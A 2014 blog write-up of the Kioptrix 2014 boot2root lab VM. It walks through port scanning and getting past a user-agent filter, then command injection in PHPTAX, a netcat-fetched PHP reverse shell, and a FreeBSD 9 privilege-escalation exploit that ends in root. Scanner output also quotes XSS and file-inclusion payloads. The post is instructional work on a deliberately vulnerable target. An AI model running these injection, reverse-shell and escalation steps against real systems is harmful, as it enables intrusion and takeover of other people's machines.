---
layout: post
title: "Kioptrix hacking challenge: Part 5"
date: 2014-04-08 02:35:09 -0400
comments: true
categories: boot2root
alias: /2014/04/kioptrix-hacking-challenge-part-5.html
---

Kioptrix 2014 is the fifth installment of the Kioptrix boot2root series. It's been about two years since the last Kioptrix release, so I was pleasantly surprised when I found out that [loneferret](https://twitter.com/@loneferret) had decided to release a new one. Kioptrix 2014 can be downloaded from [Kioptrix.com](http://www.kioptrix.com/blog/a-new-vm-after-almost-2-years/) or from [VulnHUB.com](http://vulnhub.com/entry/kioptrix_2014-5,62/)

<!--more-->

This challenge is geared for beginners, but is fun nonetheless. As it turns out, I went about this a slightly harder way since I missed something glaringly obvious in the beginning, but I'll get to that.

For this challenge I used Kali Linux and loaded Kioptrix on VMware Fusion 6. As instructed, I removed and re-added the network interface after importing the virtual machine, and started it up with no problems. 

Using netdiscover I identified the target's IP address as 192.168.1.159. I saved that into a file and passed it over to [onetwopunch.sh](/2012/05/31/port-scanning-one-two-punch/) for a TCP scan:

```
root@kali ~/ctf
# echo 192.168.1.159 > target.txt
 
root@kali ~/ctf
# onetwopunch.sh target.txt tcp
[+] scanning 192.168.1.159 for tcp ports...
[+] obtaining all open TCP ports using unicornscan...
[+] unicornscan -msf 192.168.1.159:a -l udir/192.168.1.159-tcp.txt
[+] ports for nmap to scan: 80,8080,
[+] nmap eth0 -sV -oX ndir/192.168.1.159-tcp.xml -oG ndir/192.168.1.159-tcp.grep -p 80,8080, 192.168.1.159
 
Starting Nmap 6.40 ( http://nmap.org ) at 2014-04-08 10:09 EDT
Nmap scan report for 192.168.1.159
Host is up (0.00031s latency).
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
8080/tcp open  http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
MAC Address: 00:0C:29:D3:E9:12 (VMware)
 
Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.40 seconds
[+] scans completed
```

The port scan revealed only two open ports. Loading them up on Iceweasel showed nothing remarkable:

->![](/images/2014-04-08/01.png)<-

I tried manually typing in common directory and file names but nothing was working. This process would need to be automated with dirb or wfuzz, but first, I wanted to run nikto to see if anything interesting popped up. I started off with port 80: 

```
root@kali ~/ctf
# nikto -host http://192.168.1.159
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.159
+ Target Hostname:    192.168.1.159
+ Target Port:        80
+ Start Time:         2014-04-08 10:30:27 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
+ Server leaks inodes via ETags, header found with file /, inode: 67014, size: 152, mtime: Sat Mar 29 13:22:52 2014
+ The anti-clickjacking X-Frame-Options header is not present.
+ mod_ssl/2.2.21 appears to be outdated (current is at least 2.8.31) (may depend on server version)
+ PHP/5.3.8 appears to be outdated (current is at least 5.4.26)
+ OpenSSL/0.9.8q appears to be outdated (current is at least 1.0.1e). OpenSSL 0.9.8r is also current.
+ Apache/2.2.21 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
+ mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. CVE-2002-0082, OSVDB-756.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ 7354 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2014-04-08 10:31:26 (GMT-4) (59 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

One of the more interesting entries that caught my eye in the results was CVE-2002-0082; a remote buffer overflow. The same bug was actually exploitable in the first Kioptrix challenge, but not so much in this one as it's using an updated Apache webserver. I ran nikto against port 8080 and came up with similar results:

```
root@kali ~/ctf
# nikto -host http://192.168.1.159:8080
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.159
+ Target Hostname:    192.168.1.159
+ Target Port:        8080
+ Start Time:         2014-04-08 10:33:14 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
+ The anti-clickjacking X-Frame-Options header is not present.
+ All CGI directories 'found', use '-C none' to test none
+ mod_ssl/2.2.21 appears to be outdated (current is at least 2.8.31) (may depend on server version)
+ PHP/5.3.8 appears to be outdated (current is at least 5.4.26)
+ OpenSSL/0.9.8q appears to be outdated (current is at least 1.0.1e). OpenSSL 0.9.8r is also current.
+ Apache/2.2.21 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
+ mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. CVE-2002-0082, OSVDB-756.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ 22376 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2014-04-08 10:36:20 (GMT-4) (186 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

I then tried running wfuzz to look for hidden directories but came up with nothing. Scanning seemed really slow, which led me to wonder if there might be something filtering out suspicious traffic that might be giving me incomplete information. I decided to have a look at nikto.conf and see if I could tweak it a little. One thing that I noticed right away was the USERAGENT option:

```
# User-Agent variables:
 # @VERSION     - Nikto version
 # @TESTID  - Test identifier
 # @EVASIONS    - List of active evasions
USERAGENT=Mozilla/5.00 (Nikto/@VERSION) (Evasions:@EVASIONS) (Test:@TESTID)
```

The user agent identifies itself as Nikto, maybe this is causing problems. I popped over to [UserAgentString.com](http://www.useragentstring.com/) and picked out some proper user agents from different browsers and their versions. I set the USERAGENT option to one of the user agents I picked out, ran nikto, checked the results, and repeated the process. Each time the results were the same, up until I got to the user agent for Internet Explorer 6.1: 

```
Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)
```

The results for port 80 were no different, but port 8080 showed vastly different scan results after setting the user agent to Internet Explorer 6.1: 

```
root@kali ~/ctf
# nikto -host http://192.168.1.159:8080
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.159
+ Target Hostname:    192.168.1.159
+ Target Port:        8080
+ Start Time:         2014-04-08 10:53:50 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
+ The anti-clickjacking X-Frame-Options header is not present.
+ OSVDB-3268: /: Directory indexing found.
+ mod_ssl/2.2.21 appears to be outdated (current is at least 2.8.31) (may depend on server version)
+ PHP/5.3.8 appears to be outdated (current is at least 5.4.26)
+ OpenSSL/0.9.8q appears to be outdated (current is at least 1.0.1e). OpenSSL 0.9.8r is also current.
+ Apache/2.2.21 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
+ mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. CVE-2002-0082, OSVDB-756.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /./: Directory indexing found.
+ OSVDB-3268: /?mod=node&nid=some_thing&op=view: Directory indexing found.
+ OSVDB-3268: /?mod=some_thing&op=browse: Directory indexing found.
+ /./: Appending '/./' to a directory allows indexing
+ OSVDB-3268: //: Directory indexing found.
+ //: Apache on Red Hat Linux release 9 reveals the root directory listing by default if there is no index page.
+ OSVDB-3268: /?Open: Directory indexing found.
+ OSVDB-3268: /?OpenServer: Directory indexing found.
+ OSVDB-3268: /%2e/: Directory indexing found.
+ OSVDB-576: /%2e/: Weblogic allows source code or directory listing, upgrade to v6.0 SP1 or higher. http://www.securityfocus.com/bid/2513.
+ OSVDB-3268: /?mod=<script>alert(document.cookie)</script>&op=browse: Directory indexing found.
+ OSVDB-3268: /?sql_debug=1: Directory indexing found.
+ OSVDB-3268: ///: Directory indexing found.
+ OSVDB-3268: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: Directory indexing found.
+ OSVDB-3268: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: Directory indexing found.
+ OSVDB-3268: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: Directory indexing found.
+ OSVDB-3268: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: Directory indexing found.
+ OSVDB-3268: /?PageServices: Directory indexing found.
+ OSVDB-119: /?PageServices: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. CVE-1999-0269.
+ OSVDB-3268: /?wp-cs-dump: Directory indexing found.
+ OSVDB-119: /?wp-cs-dump: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. CVE-1999-0269.
+ OSVDB-3268: ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Directory indexing found.
+ OSVDB-3288: ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Abyss 1.03 reveals directory listing when   /'s are requested.
+ OSVDB-3268: /?pattern=/etc/*&sort=name: Directory indexing found.
+ OSVDB-3268: /?D=A: Directory indexing found.
+ OSVDB-3268: /?N=D: Directory indexing found.
+ OSVDB-3268: /?S=A: Directory indexing found.
+ OSVDB-3268: /?M=A: Directory indexing found.
+ OSVDB-3268: /?\"><script>alert('Vulnerable');</script>: Directory indexing found.
+ OSVDB-3268: /?_CONFIG[files][functions_page]=http://cirt.net/rfiinc.txt?: Directory indexing found.
+ OSVDB-3268: /?npage=-1&content_dir=http://cirt.net/rfiinc.txt?&cmd=ls: Directory indexing found.
+ OSVDB-3268: /?npage=1&content_dir=http://cirt.net/rfiinc.txt?&cmd=ls: Directory indexing found.
+ OSVDB-3268: /?show=http://cirt.net/rfiinc.txt??: Directory indexing found.
+ OSVDB-3268: /?-s: Directory indexing found.
+ OSVDB-3268: /?q[]=x: Directory indexing found.
+ 7356 requests: 0 error(s) and 44 item(s) reported on remote host
+ End Time:           2014-04-08 10:54:50 (GMT-4) (60 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Back on Iceweasel, I used the User Agent Switcher Add-On and set the user agent to Internet Explorer 6, refreshed the webpage, and a directory index was returned:

->![](/images/2014-04-08/02.png)<-

Following through this link loaded the PHPTAX webapp (thanks for the tax season reminder loneferret):

->![](/images/2014-04-08/03.png)<-

Finally some progress. A quick Google search revealed that PHPTAX was vulnerable to [remote code execution](http://www.exploit-db.com/exploits/21665/). To test if this instance was vulnerable, I wrote the output of id into out.txt, and on another browser, I loaded out.txt and was able to view its contents: 

```
http://192.168.1.159:8080/phptax/index.php?pfilez=1040pg1.tob;id > out.txt&pdf=make
```

->![](/images/2014-04-08/04.png)<-

I ran uname -a and the system identified itself as FreeBSD Release 9.

```
FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd64
```

So at this point I had remote code execution, and had write access to the directory the web application was being hosted on.

From here it was time to see if I could get a reverse shell. Using whereis and which I found out that nc was installed. However, the FreeBSD version of nc didn't come with the execute option, which meant I couldn't get a reverse shell with it. No problem, Kali comes with a PHP reverse shell so I just needed to upload it. Unfortunately, curl and wget weren't installed either, so I couldn't use that to transfer my PHP reverse shell over. After mulling it over, I came up with a solution: have nc read a file with the commands to download the PHP reverse shell over. 

First, I copied /usr/share/webshells/php/php-reverse-shell.php to /var/www/r.txt. I modified the file to connect to port 443 on my machine's IP address. Next, I ran the following command on the target:

```
printf "GET http://192.168.1.128/r.txt HTTP/1.0\r\n\r\n" > get.txt
```

->![](/images/2014-04-08/05.png)<-

Now it was a matter of redirecting that file to nc:

```
nc 192.168.1.128 80 < get.txt > r.php
```

A quick check in /var/log/apache2/access.log showed that the target downloaded the file:

```
192.168.1.159 - - [08/Apr/2014:11:40:09 -0400] "GET http://192.168.1.128/r.txt HTTP/1.0" 200 5775 "-" "-"
192.168.1.159 - - [08/Apr/2014:11:40:09 -0400] "GET http://192.168.1.128/r.txt HTTP/1.0" 200 5775 "-" "-"
```

Almost there. I setup a nc listener on my machine to listen on port 443 and loaded up r.php on the target to receive my reverse shell:

->![](/images/2014-04-08/06.png)<-

One step closer to victory. I started doing a bit of system enumeration. /root was readable and I could see the flag congrats.txt but I couldn't read it just yet due to user permissions.

```
$ ls -la
total 88
drwxr-xr-x   2 root  wheel   512 Apr  8 10:01 .
drwxr-xr-x  18 root  wheel  1024 Apr  6 16:29 ..
-rw-r--r--   2 root  wheel   793 Jan  3  2012 .cshrc
-rw-------   1 root  wheel     0 Apr  6 16:29 .history
-rw-r--r--   1 root  wheel   151 Jan  3  2012 .k5login
-rw-r--r--   1 root  wheel   299 Jan  3  2012 .login
-rw-------   1 root  wheel     1 Mar 30 09:06 .mysql_history
-rw-r--r--   2 root  wheel   256 Jan  3  2012 .profile
----------   1 root  wheel  2611 Apr  3 20:58 congrats.txt
-rw-r--r--   1 root  wheel  3278 Apr  8 11:40 folderMonitor.log
lrwxr-xr-x   1 root  wheel    25 Mar 29 13:26 httpd-access.log -> /var/log/httpd-access.log
-rwxr-xr-x   1 root  wheel   574 Apr  3 19:36 lazyClearLog.sh
-rwx------   1 root  wheel  2366 Mar 28 15:09 monitor.py
lrwxr-xr-x   1 root  wheel    44 Mar 29 13:26 ossec-alerts.log -> /usr/local/ossec-hids/logs/alerts/alerts.log
```

I hit up Google for FreeBSD 9 exploits. I found a promising exploit [here](http://www.exploit-db.com/exploits/26368/). I copied it over to /var/www/ and used nc on the target to download it from my machine:

```
$ nc 192.168.1.128 80 > exploit.c 
GET http://192.168.1.128/26368.c HTTP/1.0
 
$ ls -l exploit.c
-rw-rw-rw-  1 www  wheel  2499 Apr  8 11:52 exploit.c
```

Unfortunately, I couldn't compile the source code just yet, as 11 lines of nc's output were also written to it:

```
$ head -20 exploit.c
HTTP/1.1 200 OK
Date: Tue, 08 Apr 2014 15:52:13 GMT
Server: Apache/2.2.22 (Debian)
Last-Modified: Tue, 08 Apr 2014 15:50:26 GMT
ETag: "1691a9-8a7-4f689f14e3431"
Accept-Ranges: bytes
Content-Length: 2215
Connection: close
Content-Type: text/x-csrc
X-Pad: avoid browser bug
 
/*
 * FreeBSD 9.{0,1} mmap/ptrace exploit
 * by Hunger <fbsd9lul@hunger.hu>
 *
 * Happy Birthday FreeBSD!
 * Now you are 20 years old and your security is the same as 20 years ago... :)
 *
 * Greetings to #nohup, _2501, boldi, eax, johnny_b, kocka, op, pipacs, prof,
 *              sd, sghctoma, snq, spender, s2crew and others at #hekkcamp:
$ 
</fbsd9lul@hunger.hu>
```

No problem, using wc I found that the total number of lines in the file was 100. Subtract 11 from that and use tail to get the actual source code and redirect it to exploit2.c

```
$ wc -l exploit.c
     100 exploit.c
$ tail -89 exploit.c > exploit2.c
$ head exploit2.c
/*
 * FreeBSD 9.{0,1} mmap/ptrace exploit
 * by Hunger <fbsd9lul@hunger.hu>
 *
 * Happy Birthday FreeBSD!
 * Now you are 20 years old and your security is the same as 20 years ago... :)
 *
 * Greetings to #nohup, _2501, boldi, eax, johnny_b, kocka, op, pipacs, prof,
 *              sd, sghctoma, snq, spender, s2crew and others at #hekkcamp:
 *                      I hope we'll meet again at 8@1470n ;)
$ 
</fbsd9lul@hunger.hu>
```

I compiled the exploit with gcc, ran it, and got a root shell!

```
$ gcc exploit2.c -o exploit2
$ id
uid=80(www) gid=80(www) groups=80(www)
$ ./exploit2
id
uid=0(root) gid=0(wheel) egid=80(www) groups=80(www)
```

The last step was to make /root/congrats.txt readable and view the contents:

```
cd /root   
chmod 644 congrats.txt
head congrats.txt
If you are reading this, it means you got root (or cheated).
Congratulations either way...
 
Hope you enjoyed this new VM of mine. As always, they are made for the beginner in 
mind, and not meant for the seasoned pentester. However this does not mean one 
can't enjoy them.
 
As with all my VMs, besides getting "root" on the system, the goal is to also
learn the basics skills needed to compromise a system. Most importantly, in my mind,
are information gathering & research. Anyone can throw massive amounts of exploits
```

As I mentioned at the beginning of this post, I missed something obvious. After completing the challenge, I found out from fellow #vulnhub member [teh3ck](https://twitter.com/teh_h3ck) that the source for index.html on port 80 hinted at another vulnerable web application that would have allowed me to read the contents of httpd.conf and see that it was filtering user agent strings. I'm kicking myself for missing it and doing things the hard way, but oh well. 

This was a fun and quick challenge, and I definitely recommend it to those who are new to hacking. The FreeBSD instance was a nice touch, most of the boot2roots out there are running some form of Linux, so it was refreshing to see something different. Thanks to loneferret and VulnHub for making the challenge available.
